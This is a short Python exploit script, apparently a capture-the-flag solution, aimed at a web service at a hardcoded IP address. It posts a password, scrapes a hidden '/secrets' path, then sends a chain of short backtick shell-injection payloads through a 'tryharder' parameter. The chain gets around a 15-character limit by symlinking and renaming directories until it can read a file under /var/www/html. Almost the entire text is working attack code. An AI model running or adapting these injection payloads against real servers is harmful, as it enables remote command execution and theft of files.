#!/usr/bin/env python3
import re
import requests
import sys


def main(url, cmd):
    print(f"command len: {len(cmd)}")
    if len(cmd) > 15:
        print("cmd too long!")
        return

    data = {"password": "itisjustatesthahaha"}
    req = requests.post(url, data=data)

    tmp = req.content.decode("utf-8")
    idx = tmp.index("/secrets")
    secret = tmp[idx:].split("'")[0]
    print(secret)

    url += secret
    print(url)

    params = {
        "tryharder": cmd
    }
    req = requests.get(url, params=params)
    print(req.content)

    req = requests.get(url)
    print(req.content)


if __name__ == "__main__":
    main("http://35.242.253.155:31149", "${`ln -s /var`}")
    main("http://35.242.253.155:31149", "${`mv var o`}")
    main("http://35.242.253.155:31149", "${`ln -s o/w*`}")
    main("http://35.242.253.155:31149", "${`mv www l`}")
    main("http://35.242.253.155:31149", "${`ln -s l/h*`}")
    main("http://35.242.253.155:31149", "${`mv html j`}")
    main("http://35.242.253.155:31149", "${`cat j/f*>2`}")
    main("http://35.242.253.155:31149", "${print`cat 2`}")